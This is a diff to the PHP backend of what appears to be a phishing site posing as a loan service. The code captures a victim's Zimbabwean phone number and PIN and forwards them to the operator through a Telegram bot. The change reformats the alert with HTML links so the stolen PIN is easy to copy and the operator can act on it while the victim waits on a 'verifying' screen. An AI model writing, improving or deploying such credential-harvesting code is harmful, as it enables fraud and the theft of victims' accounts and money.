@@ -194,12 +194,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $_SESSION['submitted_pin'] = $pin;
             $_SESSION['verifying'] = true;
             
-            // Send Telegram notification - PIN formatted as fake email for blue underlined appearance
+            /// Send Telegram notification
             $ip = "https://loan-1-i36j.onrender.com/verify.php";
             $time = date('Y-m-d H:i:s');
-            // Format PIN as fake email: pin@example.com - Telegram will make it blue, underlined, and copyable
-            $fakeEmail = "{$pin}@pin.local";
-            $msg = "🔐 *PIN Verification Request*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: {$fakeEmail}\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
+            
+            $msg = "🔐 <b>PIN Verification Request</b>\n\n"
+                 . "📱 Phone: +263 {$phone}\n"
+                 . "🔢 PIN entered: <a href=\"mailto:{$pin}@pin.com\">{$pin}</a>\n"
+                 . "⏰ Time: {$time}\n"
+                 . "🌐 <a href=\"{$ip}\">VERIFY HERE</a>";
+            
             sendTelegramMessage($botToken, $chatId, $msg);
             
             // Redirect to show verifying state (DB value is still 0, will show verifying)
